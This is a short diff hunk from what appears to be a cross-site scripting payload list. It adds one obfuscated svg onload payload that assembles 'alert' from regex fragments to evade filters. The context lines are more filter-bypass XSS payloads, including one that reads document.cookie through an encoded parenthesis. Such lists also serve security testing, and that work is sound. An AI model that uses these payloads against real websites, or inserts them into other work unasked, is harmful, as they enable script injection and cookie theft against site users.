@@ -4,3 +4,4 @@
 <svg onload=alert&#0000000040document.cookie)>
 <</p>iframe src=javascript:alert()//
 <</div>script</div>>alert()<</div>/script</div>>
+%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>%ff
